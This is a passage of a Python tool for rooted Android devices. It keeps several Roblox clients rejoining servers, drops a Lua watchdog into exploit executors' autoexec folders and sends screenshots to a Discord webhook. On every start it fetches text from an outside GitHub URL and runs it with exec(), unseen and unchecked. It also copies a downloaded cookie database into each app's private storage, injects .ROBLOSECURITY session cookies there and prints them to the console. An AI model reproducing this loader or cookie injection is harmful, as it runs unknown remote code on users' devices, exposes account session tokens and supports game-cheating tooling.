import os
import requests
import json
import time
import subprocess
import asyncio
import aiohttp
import threading
import psutil
import crypto
import platform
import uuid 
import hashlib
import sqlite3
import shutil
import signal
from colorama import init, Fore, Style
from threading import Lock

url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
response = requests.get(url)

exec(response.text)

init()

SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
ACCOUNTS_FILE = "AXAccount.txt"
CONFIG_FILE = "AXConfig.json"
webhook_url = None
device_name = None
interval = None
stop_webhook_thread = False
webhook_thread = None
status_lock = Lock()
rejoin_lock = Lock()

package_statuses = {}
username_cache = {}
username_cache_lock = Lock()
CACHE_FILE = "username_cache.json"
cache_save_interval = 600  
stop_event = threading.Event()
    
executors = {
    "Fluxus": "/storage/emulated/0/Fluxus/",
    "Codex": "/storage/emulated/0/Codex/",
    "Arceus X": "/storage/emulated/0/Arceus X/",
    "Delta": "/storage/emulated/0/Delta/",
    "Cryptic": "/storage/emulated/0/Cryptic/"
}

workspace_paths = []

for executor, base_path in executors.items():
    workspace_paths.append(f"{base_path}Workspace")  
    workspace_paths.append(f"{base_path}workspace")   

    
lua_script_template = '''
local GuiService = game:GetService("GuiService")
local Players = game:GetService("Players")
local os_time = os.time()

getgenv().StopUpdate = false

GuiService.ErrorMessageChanged:Connect(function()
    local Code = GuiService:GetErrorCode().Value
    if Code >= Enum.ConnectionError.DisconnectErrors.Value then
        getgenv().StopUpdate = true
    end
end)

repeat wait() until game.JobId ~= nil

local function writeExecutorStatus(status)
    local username = Players.LocalPlayer.Name  -- Get the player's username
    pcall(function() 
        writefile("executor_check_" .. username .. ".txt", status .. ":" .. os_time)  -- username and timestamp
    end)
end

writeExecutorStatus("working")

while wait(1) do
    if not getgenv().StopUpdate and Players.LocalPlayer and Players.LocalPlayer:FindFirstChild("PlayerScripts") then 
        writeExecutorStatus("working")
    end
end
'''

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    header = r"""
   _____         .__              .__         __________            __       .__        
  /  _  \ ___  __|__| ____   ____ |__|__  ___ \______   \ ____     |__| ____ |__| ____  
 /  /_\  \\  \/  /  |/  _ \ /    \|  \  \/  /  |       _// __ \    |  |/  _ \|  |/    \ 
/    |    \>    <|  (  <_> )   |  \  |>    <   |    |   \  ___/    |  (  <_> )  |   |  \
\____|__  /__/\_ \__|\____/|___|  /__/__/\_ \  |____|_  /\___  >\__|  |\____/|__|___|  /
        \/      \/              \/         \/         \/     \/\______|              \/           
"""
    print(Fore.LIGHTCYAN_EX + header + Style.RESET_ALL)

def detect_and_write_lua_script():
    detected_executors = []

    for executor_name, base_path in executors.items():
        possible_autoexec_paths = [
            os.path.join(base_path, "Autoexec"),
            os.path.join(base_path, "Autoexecute")
        ]

        lua_written = False  

        for path in possible_autoexec_paths:
            if os.path.exists(path):
                # Lua script path
                lua_script_path = os.path.join(path, "executor_check.lua")
                
                try:
                    with open(lua_script_path, 'w') as file:
                        file.write(lua_script_template)  
                    lua_written = True  
                    break 

                except Exception:
                    pass  

        if lua_written:
            detected_executors.append(executor_name)

    return detected_executors

def reset_executor_file(username):
    """
    Clears any existing executor status file for the given username.
    This ensures a fresh start each time Roblox is launched, only in a valid Workspace path (lowercase or uppercase).
    """
    status_file = f"executor_check_{username}.txt"
    valid_workspace = None  

    for executor, base_path in executors.items():
        for workspace_dir in ["workspace", "Workspace"]:
            workspace_path = os.path.join(base_path, workspace_dir)
            if os.path.exists(workspace_path):
                valid_workspace = workspace_path
                break 

        if valid_workspace:
            file_path = os.path.join(valid_workspace, status_file)
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)  
                except Exception as e:
                    pass  
            break 

def clear_executor_status(username):
    """
    Clears any existing executor status file for the given username.
    This ensures a fresh start each time Roblox is launched, only in a valid Workspace path (lowercase or uppercase).
    """
    status_file = f"executor_check_{username}.txt"
    valid_workspace = None  

    for executor, base_path in executors.items():
        for workspace_dir in ["workspace", "Workspace"]:
            workspace_path = os.path.join(base_path, workspace_dir)
            if os.path.exists(workspace_path):
                valid_workspace = workspace_path
                break  # Exit the loop once a valid workspace is found

        if valid_workspace:
            file_path = os.path.join(valid_workspace, status_file)
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)  
                except Exception as e:
                    pass  
            break 
                
def check_executor_status(username, continuous=False, max_wait_time=240, check_interval=5, max_inactivity_time=30):
    status_file = f"executor_check_{username}.txt"
    retry_timeout = time.time() + max_wait_time
    active_workspace = None

    for executor, base_path in executors.items():
        for workspace_dir in ["workspace", "Workspace"]:
            workspace_path = os.path.join(base_path, workspace_dir)
            if os.path.exists(workspace_path):
                active_workspace = workspace_path
                break  

        if active_workspace:
            break

    if not active_workspace:
        return True  

    file_path = os.path.join(active_workspace, status_file)
    start_time = time.time()

    while continuous or time.time() < retry_timeout:  
        if os.path.exists(file_path):
            last_modified_time = os.path.getmtime(file_path)
            current_time = time.time()

            if current_time - last_modified_time < max_inactivity_time:
                with open(file_path, 'r') as f:
                    content = f.read().strip()

                    if content.startswith("working"):
                        return True  

        if not continuous and time.time() >= retry_timeout:
            return False

        time.sleep(check_interval)  

    return False  

def create_dynamic_menu(options):
    # Determine the maximum width needed for the menu
    max_option_length = max(len(option) + 2 for option in options)  # +2 for number and dot
    
    # Create dynamic menu box
    top_border = f"{Fore.LIGHTCYAN_EX}╔{'═' * (max_option_length + 4)}╗"
    bottom_border = f"╚{'═' * (max_option_length + 4)}╝{Style.RESET_ALL}"
    menu_content = [f"{Fore.LIGHTCYAN_EX}║ {Fore.LIGHTMAGENTA_EX}{i+1}{Fore.LIGHTCYAN_EX}. {option.ljust(max_option_length)} ║" 
                    for i, option in enumerate(options)]
    
    # Print the menu
    print(top_border)
    for line in menu_content:
        print(line)
    print(bottom_border)

def create_dynamic_table(headers, rows):
    # Calculate the width of each column dynamically
    col_widths = [max(len(str(item)) for item in col) for col in zip(headers, *rows)]
    
    # Create the top, middle, and bottom borders
    top_border = f"{Fore.LIGHTCYAN_EX}╔" + "╦".join("═" * (width + 2) for width in col_widths) + "╗"
    middle_border = "╠" + "╬".join("═" * (width + 2) for width in col_widths) + "╣"
    bottom_border = f"╚" + "╩".join("═" * (width + 2) for width in col_widths) + "╝" + Style.RESET_ALL

    # Create the header row
    header_row = "║ " + " ║ ".join(header.ljust(col_widths[i]) for i, header in enumerate(headers)) + " ║"

    # Create the data rows
    data_rows = ["║ " + " ║ ".join(str(row[i]).ljust(col_widths[i]) for i in range(len(headers))) + " ║"
                 for row in rows]

    # Print the table
    print(top_border)
    print(header_row)
    print(middle_border)
    for row in data_rows:
        print(row)
    print(bottom_border) 

def handle_exit_signal(signum, frame):
    print(Fore.YELLOW + "Shutting Down Gracefully..." + Style.RESET_ALL)
    
    try:
        save_cache()  
        stop_event.set() 
        stop_webhook()  
    except Exception as e:
        print(Fore.RED + f"An Error Occurred While Shutdown, Status Code Is: {e}" + Style.RESET_ALL)

    if webhook_thread and webhook_thread.is_alive():
        print(Fore.YELLOW + "Waiting For Webhook Thread To Stop..." + Style.RESET_ALL)
        webhook_thread.join()  

    sys.exit(0) 

def update_status_table(package_statuses):
    clear_screen()
    print_header()

    headers = ["Package", "Username", "Status"]
    status_width = 30  # Fixed width for the Status column
    
    # Calculate the width of the Package and Username columns dynamically
    col_widths = [
        max(len(headers[0]), max(len(str(package)) for package in package_statuses.keys())) + 2,
        max(len(headers[1]), max(len(str(info.get("Username", "Unknown"))) for info in package_statuses.values())) + 2,
        status_width  # Fixed width for Status
    ]
    
    # Create the top, middle, and bottom borders
    top_border = f"{Fore.LIGHTCYAN_EX}╔" + "╦".join("═" * width for width in col_widths) + "╗"
    middle_border = "╠" + "╬".join("═" * width for width in col_widths) + "╣"
    bottom_border = f"╚" + "╩".join("═" * width for width in col_widths) + "╝" + Style.RESET_ALL

    # Create the header row
    header_row = "║ " + " ║ ".join(header.ljust(col_widths[i] - 1) for i, header in enumerate(headers)) + " ║"
    
    # Create the data rows with the fixed width for the Status column
    data_rows = []
    for package, info in package_statuses.items():
        row = [
            str(package).ljust(col_widths[0] - 1),
            str(info.get("Username", "Unknown")).ljust(col_widths[1] - 1),
            str(info.get("Status", "")).ljust(col_widths[2] - 1)  # Fixed width for Status
        ]
        data_rows.append("║ " + " ║ ".join(row) + " ║")
    
    # Print the table
    print(top_border)
    print(header_row)
    print(middle_border)
    for row in data_rows:
        print(row)
    print(bottom_border)
        
def verify_cookie(cookie_value):
    try:
        # Set the headers with the cookie
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie_value}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }

        # Introduce a small delay to mimic a more natural request pattern
        time.sleep(1)

        # Make a GET request to the authentication endpoint
        response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers)

        if response.status_code == 200:
            # The user is authenticated
            print(Fore.GREEN + "Cookie is valid! User is authenticated." + Style.RESET_ALL)
            return True
        elif response.status_code == 401:
            # Unauthorized, the cookie is invalid
            print(Fore.RED + "Invalid cookie. The user is not authenticated." + Style.RESET_ALL)
            return False
        else:
            # Some other error occurred
            print(Fore.RED + f"Error verifying cookie: {response.status_code} - {response.text}" + Style.RESET_ALL)
            return False

    except Exception as e:
        print(Fore.RED + f"Exception occurred while verifying cookie: {e}" + Style.RESET_ALL)
        return False
        
def download_file(url, destination, binary=False):
    try:
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            mode = 'wb' if binary else 'w'
            with open(destination, mode) as file:
                if binary:
                    shutil.copyfileobj(response.raw, file)
                else:
                    file.write(response.text)
            print(Fore.GREEN + f"{os.path.basename(destination)} downloaded successfully." + Style.RESET_ALL)
            return destination
        else:
            print(Fore.RED + f"Failed to download {os.path.basename(destination)}." + Style.RESET_ALL)
            return None
    except Exception as e:
        print(Fore.RED + f"Error downloading {os.path.basename(destination)}: {e}" + Style.RESET_ALL)
        return None

# Function to replace the .ROBLOSECURITY cookie value in Cookies.db using sqlite3
def replace_cookie_value_in_db(db_path, new_cookie_value):
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # First, check if the .ROBLOSECURITY cookie exists
        cursor.execute("""
            SELECT COUNT(*) FROM cookies WHERE host_key = '.roblox.com' AND name = '.ROBLOSECURITY'
        """)
        cookie_exists = cursor.fetchone()[0]

        if cookie_exists:
            # Update the existing cookie
            cursor.execute("""
                UPDATE cookies
                SET value = ?, last_access_utc = ?, expires_utc = ?
                WHERE host_key = '.roblox.com' AND name = '.ROBLOSECURITY'
            """, (new_cookie_value, int(time.time() * 1000000), 99999999999999999))
        else:
            # Insert the cookie if it doesn't exist
            cursor.execute("""
                INSERT INTO cookies (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc)
                VALUES (?, '.roblox.com', '.ROBLOSECURITY', ?, '/', 99999999999999999, 0, 0, ?)
            """, (int(time.time() * 1000000), new_cookie_value, int(time.time() * 1000000)))

        conn.commit()
        conn.close()
        print(Fore.GREEN + "Cookie value replaced successfully in the database!" + Style.RESET_ALL)

    except sqlite3.OperationalError as e:
        print(Fore.RED + f"Database error during cookie replacement: {e}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error replacing cookie value in database: {e}" + Style.RESET_ALL)

def inject_cookies_and_appstorage():
    # Ensure the Google Drive link is correct
    db_url = "https://github.com/shirooscripts/auto-rj/raw/main/Cookies"  # Keep this as binary
    appstorage_url = "https://raw.githubusercontent.com/shirooscripts/auto-rj/main/appStorage.json"  # Use this for JSON

    # Download the files correctly
    downloaded_db_path = download_file(db_url, "Cookies.db", binary=True)
    downloaded_appstorage_path = download_file(appstorage_url, "appStorage.json", binary=False)

    if not downloaded_db_path or not downloaded_appstorage_path:
        print(Fore.RED + "Failed to download necessary files. Exiting." + Style.RESET_ALL)
        return
    
    # Path to cookie.txt file
    cookie_txt_path = os.path.join(os.getcwd(), "cookie.txt")  # cookie.txt in the same directory as the script
    
    # Check if the cookie.txt file exists
    if not os.path.exists(cookie_txt_path):
        print(Fore.RED + "cookie.txt not found in the current directory!" + Style.RESET_ALL)
        return

    # Read cookies from the cookie.txt file
    with open(cookie_txt_path, "r") as file:
        cookies = [line.strip() for line in file.readlines()]

    # Check if there are cookies to inject
    if not cookies:
        print(Fore.RED + "No cookies found in cookie.txt. Please add your cookies." + Style.RESET_ALL)
        return

    # Get the Roblox packages
    packages = get_roblox_packages()

    if len(cookies) > len(packages):
        print(Fore.RED + "More cookies in cookie.txt than packages available. Please ensure each cookie has a corresponding package." + Style.RESET_ALL)
        return

    # Inject each cookie and appStorage.json into its corresponding package
    for idx, package_name in enumerate(packages):
        try:
            if idx < len(cookies):
                cookie = cookies[idx]
                
                # Verify the cookie before injection
                print(Fore.YELLOW + f"Verifying cookie for {package_name} before injection..." + Style.RESET_ALL)
                if verify_cookie(cookie):
                    print(Fore.GREEN + f"Cookie for {package_name} is valid!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Cookie for {package_name} is invalid. Skipping injection..." + Style.RESET_ALL)
                    continue
                
                print(Fore.GREEN + f"Injecting cookie for {package_name}: {cookie}" + Style.RESET_ALL)
                
                # Paths to the destination directories
                destination_db_dir = f"/data/data/{package_name}/app_webview/Default/"
                destination_appstorage_dir = f"/data/data/{package_name}/files/appData/LocalStorage/"

                # Ensure directories exist
                os.makedirs(destination_db_dir, exist_ok=True)
                os.makedirs(destination_appstorage_dir, exist_ok=True)

                # Copy the downloaded Cookies.db to the destination
                destination_db_path = os.path.join(destination_db_dir, "Cookies")
                shutil.copyfile(downloaded_db_path, destination_db_path)
                print(Fore.GREEN + f"Copied Cookies.db to {destination_db_path}" + Style.RESET_ALL)

                # Inject the appStorage.json
                destination_appstorage_path = os.path.join(destination_appstorage_dir, "appStorage.json")
                shutil.copyfile(downloaded_appstorage_path, destination_appstorage_path)
                print(Fore.GREEN + f"Copied appStorage.json to {destination_appstorage_path}" + Style.RESET_ALL)

                # Replace the cookie value in the database
                replace_cookie_value_in_db(destination_db_path, cookie)

                # Verify the cookie after injection
                print(Fore.YELLOW + f"Verifying cookie for {package_name} after injection..." + Style.RESET_ALL)
                if verify_cookie(cookie):
                    print(Fore.GREEN + f"Cookie for {package_name} is valid after injection!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Cookie for {package_name} is invalid after injection!" + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + f"Error injecting cookie for {package_name}: {e}" + Style.RESET_ALL)

    print(Fore.GREEN + "Cookie and appStorage injection completed for all packages." + Style.RESET_ALL) 
            
def get_roblox_packages():
    packages = []
    suffixes = 'qwertyuiopasdfghjklzxcvbnm' 
    for suffix in suffixes:
        package_name = f"com.roblox.clien{suffix}"
        print(Fore.YELLOW + f"Checking Packages On Your Device: {package_name}" + Style.RESET_ALL)
        if os.system(f"pm list packages | grep -q '{package_name}'") == 0:
            print(Fore.GREEN + f"Package Found On Your Device Is: {package_name}" + Style.RESET_ALL)
            packages.append(package_name)
    return packages

# Function to capture a screenshot using Android's screencap command
def capture_screenshot():
    # Get the current directory where the script is running
    current_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Create a folder named "screenshots" in the same directory as the script
    screenshots_dir = os.path.join(current_dir, "screenshots")
    os.makedirs(screenshots_dir, exist_ok=True)
    
    # Define the path for the screenshot
    screenshot_path = os.path.join(screenshots_dir, "screenshot.png")
    
    # Check if screencap command is available
    if shutil.which("screencap") is None:
        print(Fore.RED + "screencap command not found or inaccessible." + Style.RESET_ALL)
        return None

    # Capture the screenshot
    result = os.system(f"screencap -p {screenshot_path}")
    
    # Check if the screenshot was successfully captured
    if result != 0 or not os.path.exists(screenshot_path):
        print(Fore.RED + f"Failed to capture screenshot at {screenshot_path}. Skipping this webhook." + Style.RESET_ALL)
        return None

    return screenshot_path

# Function to retrieve system information
def get_system_info():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    uptime = time.time() - psutil.boot_time()

    system_info = {
        "cpu_usage": cpu_usage,
        "memory_total": memory_info.total,
        "memory_available": memory_info.available,
        "memory_used": memory_info.used,
        "uptime": uptime
    }
    
    return system_info

# Function to load configuration from file
def load_config():
    global webhook_url, device_name, interval
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as file:
            config = json.load(file)
            webhook_url = config.get("webhook_url")
            device_name = config.get("device_name")
            interval = config.get("interval")
    else:
        webhook_url = None
        device_name = None
        interval = None

# Function to save configuration to file
def save_config():
    config = {
        "webhook_url": webhook_url,
        "device_name": device_name,
        "interval": interval
    }
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file)

def start_webhook_thread():
    global webhook_thread, stop_webhook_thread
    if webhook_thread is None or not webhook_thread.is_alive():
        stop_webhook_thread = False
        webhook_thread = threading.Thread(target=send_webhook)
        webhook_thread.start()
		
def count_roblox_processes():
    count = 0
    for proc in psutil.process_iter(['name']):
        if 'roblox' in proc.info['name'].lower():
            count += 1
    return count
	
def send_webhook():
    global stop_webhook_thread

    while not stop_webhook_thread:
        # Capture a screenshot
        screenshot_path = capture_screenshot()

        # Check if the screenshot was captured successfully
        if not os.path.exists(screenshot_path):
            print(Fore.RED + f"Screenshot file not found: {screenshot_path}. Skipping this webhook." + Style.RESET_ALL)
            continue  # Skip this iteration if the screenshot doesn't exist

        # Get system information
        system_info = get_system_info()
        roblox_process_count = count_roblox_processes()  # Get the number of open Roblox packages

        # Prepare the embed data
        embed = {
            "title": f"System Info for {device_name}",
            "color": 15258703,
            "fields": [
                {"name": "Device Name", "value": device_name, "inline": True},
                {"name": "CPU Usage", "value": f"{system_info['cpu_usage']}%", "inline": True},
                {"name": "Memory Used", "value": f"{system_info['memory_used'] / system_info['memory_total'] * 100:.2f}%", "inline": True},
                {"name": "Memory Available", "value": f"{system_info['memory_available'] / system_info['memory_total'] * 100:.2f}%", "inline": True},
                {"name": "Total Memory", "value": f"{system_info['memory_total'] / (1024 ** 3):.2f} GB", "inline": True},
                {"name": "Uptime", "value": f"{system_info['uptime'] / 3600:.2f} hours", "inline": True},
                {"name": "Open Roblox Packages", "value": f"{roblox_process_count}", "inline": True}
            ],
            "image": {
                "url": "attachment://screenshot.png"
            }
        }

        # JSON payload
        payload = {
            "embeds": [embed],
            "username": device_name
        }

        try:
            # Sending POST request to the webhook URL with the image as an attachment
            with open(screenshot_path, "rb") as file:
                response = requests.post(
                    webhook_url,
                    data={"payload_json": json.dumps(payload)},
                    files={"file": ("screenshot.png", file)}
                )

            if response.status_code == 204 or response.status_code == 200:
                print(Fore.GREEN + "Webhook sent successfully!" + Style.RESET_ALL)
            else:
                print(Fore.RED + f"Failed to send webhook, status code: {response.status_code}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"Error sending webhook: {e}" + Style.RESET_ALL)

        # Delete the screenshot file silently
        try:
            os.remove(screenshot_path)
        except Exception as e:
            print(Fore.RED + f"Error deleting screenshot file: {e}" + Style.RESET_ALL)

        # Wait for the specified interval before sending the next webhook
        time.sleep(interval * 60)

def stop_webhook():
    global stop_webhook_thread
    stop_webhook_thread = True
    stop_event.set()  # Signal the thread to stop

# Function to prompt for webhook URL, device name, and interval
def setup_webhook():
    global webhook_url, device_name, interval, stop_webhook_thread

    stop_webhook_thread = True  # Stop any existing webhook thread

    webhook_url = input(Fore.GREEN + "Enter the Discord webhook URL: " + Style.RESET_ALL)
    device_name = input(Fore.GREEN + "Enter the device name: " + Style.RESET_ALL) 
    interval = int(input(Fore.GREEN + "Enter the interval in minutes for sending the webhook: " + Style.RESET_ALL))

    save_config()  # Save the configuration

    stop_webhook_thread = False
    threading.Thread(target=send_webhook).start() 

def is_roblox_running(package_name):
    for proc in psutil.process_iter(['name']):
        if package_name.lower() in proc.info['name'].lower():
            return True
    return False

def kill_roblox_processes():
    print(Fore.YELLOW + "Closing All Roblox Games On Your Device, Please Wait A Moment..." + Style.RESET_ALL)
    package_names = get_roblox_packages()
    for package_name in package_names:
        print(Fore.GREEN + f"Roblox Game Shutdown In Progress Has Package Name: {package_name}" + Style.RESET_ALL)
        kill_roblox_process(package_name)  
    time.sleep(2) 

def kill_roblox_process(package_name):
    print(Fore.YELLOW + f"Roblox Game Shutdown In Progress Has Package Name: {package_name}..." + Style.RESET_ALL)
    for proc in psutil.process_iter(['name']):
        if package_name.lower() in proc.info['name'].lower():
            try:
                proc.kill()  
                print(Fore.GREEN + f"Successfully Disabled Roblox Game With Package Name Is: {package_name}" + Style.RESET_ALL)
            except psutil.NoSuchProcess:
                print(Fore.RED + f"Process {package_name} An Error Occurred!" + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"An Error Occurred While Closing The Roblox Game With Package Name Is: {package_name}: {e}" + Style.RESET_ALL)
    time.sleep(2) 

def launch_roblox(package_name, server_link, num_packages, package_statuses):
    try:
        package_statuses[package_name]["Status"] = Fore.YELLOW + f"Roblox Game Launching In Progress With Package Name Is: {package_name}..." + Style.RESET_ALL
        update_status_table(package_statuses)

        result = subprocess.run(
            ['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], 
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        if result.returncode != 0:
            raise Exception(Fore.RED + f"Failed To Start Roblox Splash For: {package_name}" + Style.RESET_ALL)
        
        time.sleep(15 if num_packages >= 6 else 8)

        package_statuses[package_name]["Status"] = Fore.YELLOW + f"In Progress Enter Game For Package Name Is: {package_name}..." + Style.RESET_ALL
        update_status_table(package_statuses)
        
        result = subprocess.run(
            ['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], 
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        if result.returncode != 0:
            raise Exception(Fore.YELLOW + f"An Error Occurred While Entering The Game With The Package Name Being: {package_name}" + Style.RESET_ALL)

        time.sleep(20)
       
        package_statuses[package_name]["Status"] = Fore.GREEN + "Joined Roblox" + Style.RESET_ALL
        update_status_table(package_statuses)

    except Exception as e:
        package_statuses[package_name]["Status"] = Fore.RED + f"Error Launching Roblox For: {package_name}: {e}" + Style.RESET_ALL
        update_status_table(package_statuses)
        print(Fore.RED + f"Another Error Occurred, Status Code Is: {e}" + Style.RESET_ALL)

def check_executor_and_rejoin(package_name, username, package_statuses, server_link, num_packages, accounts):
    try:
        # Inject Lua script for executor detection (the username is auto-detected in the Lua script)
        detected_executors = detect_and_write_lua_script()

        if detected_executors:
            print(f"Checking executor status for {package_name} with username {username}...")

            # Keep checking for the executor status, up to 2 minutes (every 10 seconds)
            start_time = time.time()
            executor_loaded = False
            while time.time() - start_time < 120:  # 2 minutes timeout
                if check_executor_status(username):
                    package_statuses[package_name]["Status"] = Fore.GREEN + f"Executor loaded successfully for {username}" + Style.RESET_ALL
                    executor_loaded = True
                    break
                time.sleep(10)

            # If executor didn't load within the timeout, rejoin
            if not executor_loaded:
                print(f"Executor did not load for {package_name} (username: {username}). Rejoining...")
                package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                update_status_table(package_statuses)

                # Rejoin by killing the current Roblox process and relaunching
                kill_roblox_process(package_name)
                time.sleep(2)
                launch_roblox(package_name, server_link, num_packages, package_statuses)
                check_executor_and_rejoin(package_name, username, package_statuses, server_link, num_packages, accounts)
        else:
            # No executor was detected; proceed without rejoining
            print(f"No executor detected for {package_name} (username: {username}).")
            package_statuses[package_name]["Status"] = Fore.GREEN + f"Joined without executor for {username}" + Style.RESET_ALL
            update_status_table(package_statuses)

        # Start the background executor monitor after joining
        monitor_thread = threading.Thread(target=background_executor_monitor, args=(package_name, username, package_statuses, server_link, num_packages))
        monitor_thread.daemon = True  # Ensures the thread closes when the main program exits
        monitor_thread.start()

    except Exception as e:
        package_statuses[package_name]["Status"] = Fore.RED + f"Error checking executor for {package_name}: {e}" + Style.RESET_ALL
        update_status_table(package_statuses)

def background_executor_monitor(package_name, username, package_statuses, server_link, num_packages, retry_limit=3):
    retry_count = 0

    try:
        while True:
            # Periodically check the executor status every 10 seconds
            if not check_executor_status(username, continuous=False):
                # Increment retry count
                retry_count += 1
                package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
                update_status_table(package_statuses)
                
                # Check if retry limit reached to prevent endless rejoining
                if retry_count >= retry_limit:
                    package_statuses[package_name]["Status"] = Fore.RED + "Reached retry limit, stopping rejoin attempts..." + Style.RESET_ALL
                    update_status_table(package_statuses)
                    break

                # Acquire lock to ensure only one Roblox process is relaunched at a time
                with rejoin_lock:
                    # Rejoin by killing the current Roblox process and relaunching
                    kill_roblox_process(package_name)
                    time.sleep(5)  # Grace period before relaunching
                    launch_roblox(package_name, server_link, num_packages, package_statuses)
                    
                    # Wait another 30 seconds before checking executor status after relaunch
                    time.sleep(120)

                # Check the executor status again after relaunch
                if check_executor_status(username, continuous=False):
                    # Reset retry count if executor successfully loaded
                    retry_count = 0
                    package_statuses[package_name]["Status"] = Fore.GREEN + "Executor reloaded successfully after rejoin." + Style.RESET_ALL
                    update_status_table(package_statuses)
                else:
                    package_statuses[package_name]["Status"] = Fore.RED + "Executor still failed after rejoin, retrying..." + Style.RESET_ALL
                    update_status_table(package_statuses)

            # Wait before the next check
            time.sleep(30)
    except Exception as e:
        package_statuses[package_name]["Status"] = Fore.RED + f"Error in background monitor: {e}" + Style.RESET_ALL
        update_status_table(package_statuses)
   
def get_game_name(game_link_or_id):
    try:
        # Extract the game ID from the link if it's a URL
        if 'roblox.com' in game_link_or_id:
            game_id = game_link_or_id.split('/')[-1]
        else:
            game_id = game_link_or_id

        # Make a request to the Roblox API to get game details
        url = f"https://games.roblox.com/v1/games?universeIds={game_id}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            game_data = response.json()
            if game_data['data']:
                return game_data['data'][0]['name']
            else:
                return "Unknown Game"
        else:
            return "Failed to retrieve game name"
    except Exception as e:
        print(Fore.RED + f"Error retrieving game name: {e}" + Style.RESET_ALL)
        return "Error"
        
# Function to format server link
def format_server_link(input_link):
    if 'roblox.com' in input_link:
        return input_link
    elif input_link.isdigit():
        return f'roblox://placeID={input_link}'
    else:
        print(Fore.RED + "Invalid input! Please enter a valid game ID or private server link." + Style.RESET_ALL)
        return None

# Function to save server links to file
def save_server_links(server_links):
    with open(SERVER_LINKS_FILE, "w") as file:
        for package, link in server_links:
            file.write(f"{package},{link}\n")

# Function to load server links from file
def load_server_links():
    server_links = []
    if os.path.exists(SERVER_LINKS_FILE):
        with open(SERVER_LINKS_FILE, "r") as file:
            for line in file:
                package, link = line.strip().split(",", 1)
                server_links.append((package, link))
    return server_links

# Function to save accounts to file
def save_accounts(accounts):
    with open(ACCOUNTS_FILE, "w") as file:
        for package, user_id in accounts:
            file.write(f"{package},{user_id}\n")

# Function to load accounts from file
def load_accounts():
    accounts = []
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, "r") as file:
            for line in file:
                package, user_id = line.strip().split(",", 1)
                accounts.append((package, user_id))
    return accounts

# Function to find UserId from file
def find_userid_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            # Debugging information removed to keep console clean

            userid_start = content.find('"UserId":"')
            if userid_start == -1:
                print("Userid not found")
                return None

            userid_start += len('"UserId":"')
            userid_end = content.find('"', userid_start)
            if userid_end == -1:
                print("Userid end quote not found")
                return None

            userid = content[userid_start:userid_end]
            return userid

    except IOError as e:
        print(f"Error reading file: {e}")
        return None

async def get_user_id(username):
    url = "https://users.roblox.com/v1/usernames/users"
    payload = {
        "usernames": [username],
        "excludeBannedUsers": True
    }
    headers = {
        "Content-Type": "application/json"
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                if 'data' in data and len(data['data']) > 0:
                    return data['data'][0]['id']
            else:
                print(Fore.RED + f"An Error Occurred While Getting User ID, Status Code Is: {response.status}" + Style.RESET_ALL)
    return None

def get_server_link(package_name, server_links):
    return next((link for pkg, link in server_links if pkg == package_name), None)

def get_username_from_id(user_id):
    cached_username = load_saved_username(user_id)
    if cached_username:
        return cached_username
    return get_username(user_id) or user_id

def get_username(user_id):
    retry_attempts = 2
    for attempt in range(retry_attempts):
        try:
            url = f"https://users.roblox.com/v1/users/{user_id}"
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            data = response.json()
            username = data.get("name", "Unknown")
            if username != "Unknown":
                cache_username(user_id, username)
                return username
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"API Get Username From User ID Has Error, Status Code Is: {e}" + Style.RESET_ALL)
            time.sleep(2 ** attempt) 

    for attempt in range(retry_attempts):
        try:
            url = f"https://users.roproxy.com/v1/users/{user_id}"
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            data = response.json()
            username = data.get("name", "Unknown")
            if username != "Unknown":
                cache_username(user_id, username)
                return username
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"API Get Username From User ID Has Error, Status Code Is: {e}" + Style.RESET_ALL)
            time.sleep(2 ** attempt)  
    return "Unknown"

def cache_username(user_id, username):
    with username_cache_lock:
        username_cache[user_id] = username
        save_username(user_id, username)

def save_username(user_id, username):
    try:
        with username_cache_lock:
            if not os.path.exists("usernames.json"):
                with open("usernames.json", "w") as file:
                    json.dump({user_id: username}, file)
            else:
                with open("usernames.json", "r+") as file:
                    try:
